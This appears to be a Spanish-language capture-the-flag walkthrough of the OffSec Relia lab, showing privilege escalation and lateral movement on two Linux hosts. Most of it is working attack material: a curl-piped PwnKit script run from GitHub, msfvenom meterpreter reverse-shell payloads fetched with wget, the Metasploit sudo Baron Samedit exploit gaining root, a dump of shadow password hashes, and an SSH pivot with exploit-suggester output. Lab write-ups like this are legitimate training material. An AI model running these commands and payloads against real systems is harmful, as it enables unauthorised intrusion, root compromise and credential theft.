PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
$ cat /etc/issue
Ubuntu 20.04.5 LTS \n \l

$ arch
x86_64
$ whoami
anita
$ id
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
$ who -a
           system boot  2024-03-29 07:20
           run-level 5  2024-03-29 07:20
LOGIN      tty1         2024-03-29 07:20               732 id=tty1
anita    + pts/0        2025-06-08 13:37   .          2165 (192.168.45.239)
$ sudo -l
[sudo] password for anita: 
Sorry, try again.
[sudo] password for anita: 
Sorry, try again.
[sudo] password for anita: 
sudo: 3 incorrect password attempts
$ find / -perm -4000 2>/dev/null
/usr/bin/at
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/snap/core18/2566/bin/mount
/snap/core18/2566/bin/ping
/snap/core18/2566/bin/su
/snap/core18/2566/bin/umount
/snap/core18/2566/usr/bin/chfn
/snap/core18/2566/usr/bin/chsh
/snap/core18/2566/usr/bin/gpasswd
/snap/core18/2566/usr/bin/newgrp
/snap/core18/2566/usr/bin/passwd
/snap/core18/2566/usr/bin/sudo
/snap/core18/2566/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2566/usr/lib/openssh/ssh-keysign
/snap/core18/1705/bin/mount
/snap/core18/1705/bin/ping
/snap/core18/1705/bin/su
/snap/core18/1705/bin/umount
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1705/usr/lib/openssh/ssh-keysign
/snap/snapd/17336/usr/lib/snapd/snap-confine
/snap/core20/1623/usr/bin/chfn
/snap/core20/1623/usr/bin/chsh
/snap/core20/1623/usr/bin/gpasswd
/snap/core20/1623/usr/bin/mount
/snap/core20/1623/usr/bin/newgrp
/snap/core20/1623/usr/bin/passwd
/snap/core20/1623/usr/bin/su
/snap/core20/1623/usr/bin/sudo
/snap/core20/1623/usr/bin/umount
/snap/core20/1623/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1623/usr/lib/openssh/ssh-keysign
$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
$ id
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
$ ls
'GCONV_PATH=.'   local.txt
$ cd /tmp
$ pwd
/tmp
$ id
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
$ id
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
$ ls
'GCONV_PATH=.'   systemd-private-0bbbd25782914308943f7c58f96666eb-ModemManager.service-YRQxyf     systemd-private-0bbbd25782914308943f7c58f96666eb-systemd-resolved.service-cJbk6e    vmware-root_600-2722697857
 snap.lxd        systemd-private-0bbbd25782914308943f7c58f96666eb-systemd-logind.service-chZWMf   systemd-private-0bbbd25782914308943f7c58f96666eb-systemd-timesyncd.service-n31Efh
$ pkexec
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
$ which gcc
/usr/bin/gcc
$ aa-status | head
You do not have enough privilege to read the profile set.
apparmor module is loaded.
$
```
> Insistimos y enumeramos con les.sh

```bash
$ ./les.sh

Available information:

Kernel version: 5.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 20.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
```

#### subimos linpeas y obtenemos lo siguiente:

```bash
Vulnerable to CVE-2021-3560

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Protections
‚ïê‚ï£ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                     
apparmor module is loaded.
‚ïê‚ï£ AppArmor profile? .............. unconfined
‚ïê‚ï£ is linuxONE? ................... s390x Not Found
‚ïê‚ï£ grsecurity present? ............ grsecurity Not Found                                                                                                                                                          
‚ïê‚ï£ PaX bins present? .............. PaX Not Found                                                                                                                                                                 
‚ïê‚ï£ Execshield enabled? ............ Execshield Not Found                                                                                                                                                          
‚ïê‚ï£ SELinux enabled? ............... sestatus Not Found                                                                                                                                                            
‚ïê‚ï£ Seccomp enabled? ............... disabled                                                                                                                                                                      
‚ïê‚ï£ User namespace? ................ enabled
‚ïê‚ï£ Cgroup2 enabled? ............... enabled
‚ïê‚ï£ Is ASLR enabled? ............... Yes
‚ïê‚ï£ Printer? ....................... No
‚ïê‚ï£ Is this a virtual machine? ..... Yes (vmware) 

```
> Ninguno de los intentos de con los vectores **CVE-2021-4034** y **CVE-2021-3560** dio resultados, la tecer salida de **les.sh** es **CVE-2021-3156**

* Observamos la version de sudo:

```bash
$ sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

* Buscamos en **MSF** un exploit:

```msfconsole
msf6 exploit(multi/handler) > search type:exploit cve-2021-3156

Matching Modules
================

   #   Name                                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                                    ---------------  ----       -----  -----------
   0   exploit/linux/local/sudo_baron_samedit                                  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
   1     \_ target: Automatic                                                  .                .          .      .
   2     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                .                .          .      .
   3     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative  .                .          .      .
   4     \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                .                .          .      .
   5     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                .                .          .      .
   6     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative  .                .          .      .
   7     \_ target: Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)                .                .          .      .
   8     \_ target: Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)               .                .          .      .
   9     \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28)                   .                .          .      .
   10    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative     .                .          .      .
   11    \_ target: CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)                  .                .          .      .
   12    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17)                    .                .          .      .
   13    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative      .                .          .      .
   14    \_ target: Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)                 .                .          .      .
   15    \_ target: Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)                 .                .          .      .
   16    \_ target: Fedora 25 x64 (sudo v1.8.18, libc v2.24)                   .                .          .      .
   17    \_ target: Fedora 24 x64 (sudo v1.8.16, libc v2.23)                   .                .          .      .
   18    \_ target: Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)                 .                .          .      .
   19    \_ target: Manual                                                     .                .          .      .


Interact with a module by name or index. For example info 19, use 19 or use exploit/linux/local/sudo_baron_samedit
After interacting with a module you can manually set a TARGET with set TARGET 'Manual'
```
> **IMPORTANTE** el modulo requiere como opcion obligatoria una session meterpreter.

1. Levantamos la sesion meterpreter:

* Generamos el backdoor
```msfconsole
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.239 LPORT=4444 -f elf -o shell.elf
# servimos con python:
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.180.245 - - [09/Jun/2025 13:11:56] "GET /shell.elf HTTP/1.1" 200 -
# Solicitamos el backdor desde la sesion ssh de anita:
$ wget http://192.168.45.239:8000/shell.elf
--2025-06-09 16:11:51--  http://192.168.45.239:8000/shell.elf
Connecting to 192.168.45.239:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250 [application/octet-stream]
Saving to: ‚Äòshell.elf‚Äô

shell.elf                                            100%[====================================================================================================================>]     250  --.-KB/s    in 0s      

2025-06-09 16:11:51 (24.2 MB/s) - ‚Äòshell.elf‚Äô saved [250/250]

$ chmod +x shell.elf
$ ./shell.elf
```
* Configuramos el exploit/multi/handler
```msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.239:4444 
[*] Sending stage (3045380 bytes) to 192.168.180.245
[*] Meterpreter session 1 opened (192.168.45.239:4444 -> 192.168.180.245:41156) at 2025-06-09 13:24:19 -0300
```
> Si es necesario volver a ejecutar **./shell.elf**

2. Configuramos el exploit y ejecutamos:

```msfconsole
msf6 exploit(multi/handler) > search type:exploit cve-2021-3156

Matching Modules
================

   #   Name                                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                                    ---------------  ----       -----  -----------
   0   exploit/linux/local/sudo_baron_samedit                                  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
   1     \_ target: Automatic                                                  .                .          .      .
   2     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                .                .          .      .
   3     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative  .                .          .      .
   4     \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                .                .          .      .
   5     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                .                .          .      .
   6     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative  .                .          .      .
   7     \_ target: Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)                .                .          .      .
   8     \_ target: Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)               .                .          .      .
   9     \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28)                   .                .          .      .
   10    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative     .                .          .      .
   11    \_ target: CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)                  .                .          .      .
   12    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17)                    .                .          .      .
   13    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative      .                .          .      .
   14    \_ target: Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)                 .                .          .      .
   15    \_ target: Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)                 .                .          .      .
   16    \_ target: Fedora 25 x64 (sudo v1.8.18, libc v2.24)                   .                .          .      .
   17    \_ target: Fedora 24 x64 (sudo v1.8.16, libc v2.23)                   .                .          .      .
   18    \_ target: Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)                 .                .          .      .
   19    \_ target: Manual                                                     .                .          .      .


Interact with a module by name or index. For example info 19, use 19 or use exploit/linux/local/sudo_baron_samedit
After interacting with a module you can manually set a TARGET with set TARGET 'Manual'

msf6 exploit(multi/handler) > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/sudo_baron_samedit) > options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION                       yes       The session to run this module on
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(linux/local/sudo_baron_samedit) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/sudo_baron_samedit) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(linux/local/sudo_baron_samedit) > set LPORT 1234
LPORT => 1234
msf6 exploit(linux/local/sudo_baron_samedit) > run
[*] Started reverse TCP handler on 192.168.45.239:1234 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/Xee5yp.py' (763 bytes) ...
[*] Writing '/tmp/libnss_Qc/uZFK .so.2' (540 bytes) ...
[*] Sending stage (3045380 bytes) to 192.168.180.245
[+] Deleted /tmp/Xee5yp.py
[+] Deleted /tmp/libnss_Qc/uZFK .so.2
[+] Deleted /tmp/libnss_Qc
[*] Meterpreter session 2 opened (192.168.45.239:1234 -> 192.168.180.245:35172) at 2025-06-09 14:01:25 -0300

meterpreter > getuid
Server username: root
meterpreter >
```
3. Obtenemos el flag:

```msfconsole
meterpreter > pwd
/tmp
meterpreter > cd /root
meterpreter > pwd
/root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  101   fil   2022-11-11 09:07:58 -0300  .bash_history
100644/rw-r--r--  3106  fil   2019-12-05 11:39:21 -0300  .bashrc
040700/rwx------  4096  dir   2022-10-26 07:19:07 -0300  .cache
040755/rwxr-xr-x  4096  dir   2022-10-26 07:20:00 -0300  .local
100644/rw-r--r--  161   fil   2019-12-05 11:39:21 -0300  .profile
040700/rwx------  4096  dir   2022-10-12 04:57:28 -0300  .ssh
100644/rw-r--r--  209   fil   2022-10-12 05:55:45 -0300  .wget-hsts
100644/rw-r--r--  33    fil   2025-06-09 12:15:09 -0300  proof.txt
040755/rwxr-xr-x  4096  dir   2022-10-12 04:57:43 -0300  snap

meterpreter > cat proof.txt
1e0dc9497b51bcc3f37a7dd885264cdc
meterpreter >
```

#### Buscamos credenciales que nos permitan acceder a otra maquina:

```msfconsole
msf6 exploit(linux/local/sudo_baron_samedit) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter x64/linux  anita @ 192.168.180.245  192.168.45.239:4444 -> 192.168.180.245:41156 (192.168.180.245)
  2         meterpreter x64/linux  root @ 192.168.180.245   192.168.45.239:1234 -> 192.168.180.245:35172 (192.168.180.245)

msf6 exploit(linux/local/sudo_baron_samedit) > search type:post linux

Matching Modules
================

   #   Name                                                          Disclosure Date  Rank       Check  Description
   -   ----                                                          ---------------  ----       -----  -----------
   ...

   25  post/linux/gather/enum_configs                                .                normal     No     Linux Gather Configurations
   26  post/linux/gather/checkcontainer                              .                normal     No     Linux Gather Container Detection
   27  post/linux/gather/hashdump                                    .                normal     No     Linux Gather Dump Password Hashes for Linux Systems # Interesante.
   28  post/linux/gather/gnome_commander_creds                       .                normal     No     Linux Gather Gnome-Commander Creds
   29  post/multi/gather/enum_hexchat                                .                normal     No     Linux Gather HexChat/XChat Enumeration
   
   ...

msf6 exploit(linux/local/sudo_baron_samedit) > use 27
msf6 post(linux/gather/hashdump) > options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(linux/gather/hashdump) > set SESSION 2
SESSION => 2
msf6 post(linux/gather/hashdump) > run
[+] root:$6$hUF5ezihFkozDRs7$AAkBctkoXVYOjhYOLW22EDkdoXXM085da.v9tPQTZlUtNvKNdV.jrZl5M.WbRJyyQyjh//JXUH0hyQVyyhWgj/:0:0:root:/root:/bin/bash
[+] offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:1000:1000:Offsec Admin:/home/offsec:/bin/bash
[+] miranda:$6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhdsyjHUaw4qO0YAwEMoXUXWBdCd3zW4V.:1001:1001:Miranda:/home/miranda:/bin/sh
[+] steven:$6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrUCP0ogsFH9IjG3i2qekcAXRlkmeZOT1:1002:1002:Steven:/home/steven:/bin/sh
[+] mark:$6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrlaHeaX.pFhlJ3lif10E1zsO3W2tdbC/:1003:1003:Mark:/home/mark:/bin/sh
[+] anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:1004:1004:Anita:/home/anita:/bin/sh
[+] Unshadowed Password File: /root/.msf4/loot/20250609154140_relia_192.168.180.245_linux.hashes_997206.txt
[*] Post module execution completed
msf6 post(linux/gather/hashdump) > loot

Loot
====

host             service  type                  name                   content     info                            path
----             -------  ----                  ----                   -------     ----                            ----
192.168.180.245           linux.passwd          passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20250609154137_relia_192.168.180.245_linux.passwd_700690.txt
192.168.180.245           linux.shadow          shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20250609154138_relia_192.168.180.245_linux.shadow_517407.txt
192.168.180.245           linux.passwd.history  opasswd.tx             text/plain  Linux Passwd History File       /root/.msf4/loot/20250609154139_relia_192.168.180.245_linux.passwd.his_960666.txt
192.168.180.245           linux.hashes          unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20250609154140_relia_192.168.180.245_linux.hashes_997206.txt

msf6 post(linux/gather/hashdump) > creds
Credentials
===========

host  origin           service  public   private                                                                                   realm  private_type        JtR Format    cracked_password
----  ------           -------  ------   -------                                                                                   -----  ------------        ----------    ----------------
      192.168.180.245           root     $6$hUF5ezihFkozDRs7$AAkBctkoXVYOjhYOLW22EDkdoXXM085da.v9tPQTZlUtNvKNdV.jrZl5 (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           offsec   $6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeI (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           miranda  $6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhds (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           steven   $6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrU (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           mark     $6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrl (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           anita    $6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8Y (TRUNCATED)         Nonreplayable hash  sha512,crypt
```
#### Probamos las credenciales ssh de anita en el otro servidor .246 y entramos:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ssh -i id_ecdsa_anita -p 2222 anita@192.168.104.246
The authenticity of host '[192.168.104.246]:2222 ([192.168.104.246]:2222)' can't be established.
ED25519 key fingerprint is SHA256:4g8ssrvbgowohNQnriYhXGCgKvR01WciUUGeVxvx+uE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.104.246]:2222' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_ecdsa_anita': 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 11 11:19:24 PM UTC 2025

  System load:  0.0               Processes:               146
  Usage of /:   60.1% of 6.06GB   Users logged in:         0
  Memory usage: 12%               IPv4 address for ens192: 192.168.104.246
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

5 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Oct 26 19:00:52 2022 from 192.168.118.2
$ 

```
- Obtenemos el flag local.txt

```bash
$ cat local.txt
306c7aaf53142804b30c14605b63e057
```
#### Session meterpreter

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.213 LPORT=4444 -f elf -o shell.elf
```
- En msf:

```msfconsole

msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.213
LHOST => 192.168.45.213

msf6 exploit(multi/handler) > options

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.213   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.213:4444 
[*] Sending stage (1017704 bytes) to 192.168.231.246
[*] Meterpreter session 1 opened (192.168.45.213:4444 -> 192.168.231.246:49368) at 2025-06-12 19:20:48 -0300

meterpreter >
```
- Servimos y subimos el **shell.elf** y repetimos los pasos del metrpreter anterior

- Enumeramos desde la sesion meterpreter

```bash
meterpreter > ps

Process List
============

 PID    PPID  Name                                   Arch    User              Path
 ---    ----  ----                                   ----    ----              ----
 820    1     sshd                                   x86_64  root
 863    1     apache2                                x86_64  root
 870    1     python3                                x86_64  root
 1337   2     [kworker/0:2-cgroup_destroy]           x86_64  root
 1539   820   sshd                                   x86_64  root
 1543   1     systemd                                x86_64  anita             /usr/lib/systemd/systemd
 1545   1543  (sd-pam)                               x86_64  anita
 1652   1539  sshd                                   x86_64  anita
 1658   1652  sh                                     x86_64  anita             /usr/bin/dash
 4779   1543  dbus-daemon                            x86_64  anita             /usr/bin/dbus-daemon
 10493  1543  gpg-agent                              x86_64  anita
 28059  863   apache2                                x86_64  www-data
 28060  863   apache2                                x86_64  www-data
 28061  863   apache2                                x86_64  www-data
 28062  863   apache2                                x86_64  www-data
 28063  863   apache2                                x86_64  www-data
 28138  1658  shell.elf                              x86     anita             /home/anita/shell.elf
 28364  2     [kworker/u2:1-events_power_efficient]  x86_64  root
 28365  2     [kworker/u2:0-events_unbound]          x86_64  root
 28371  2     [kworker/0:0-ata_sff]                  x86_64  root
 28424  2     [kworker/u2:2-events_unbound]          x86_64  root
```

#### Buscamos posibles exploits:

```msfconsole
meterpreter > background
[*] Backgrounding session 5...                                                                                                                                                                                    
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester                                                                                                                                        
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 5                                                                                                                                                    
SESSION => 5                                                                                                                                                                                                      
msf6 post(multi/recon/local_exploit_suggester) > options                                                                                                                                                          
                                                                                                                                                                                                                  
Module options (post/multi/recon/local_exploit_suggester):                                                                                                                                                        
                                                                                                                                                                                                                  
   Name             Current Setting  Required  Description                                                                                                                                                        
   ----             ---------------  --------  -----------                                                                                                                                                        
   SESSION          5                yes       The session to run this module on                                                                                                                                  
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits                                                                                                         
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
View the full module info with the info, or info -d command.                                                                                                                                                      
                                                                                                                                                                                                                  
msf6 post(multi/recon/local_exploit_suggester) > run                                                                                                                                                              
[*] 192.168.104.246 - Collecting local exploits for x86/linux...                                                                                                                                                  
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.                                                                                                                                                               
You can add syslog to your Gemfile or gemspec to silence this warning.                                                                                                                                            
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.                                                                                                                        
[*] 192.168.104.246 - 203 exploit checks are being tried...                                                                                                                                                       
[+] 192.168.104.246 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.15.0                                                                        
[+] 192.168.104.246 - exploit/linux/local/glibc_tunables_priv_esc: The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable                          
[+] 192.168.104.246 - exploit/linux/local/pkexec: The service is running, but could not be validated.                                                                                                             
[+] 192.168.104.246 - exploit/linux/local/su_login: The target appears to be vulnerable.                                                                                                                          
[+] 192.168.104.246 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.9.9.pre.1ubuntu2 is vulnerable, but unable to determine editable file. Please set EDITABLEFILE option manually                                                                                                                                                                                                      
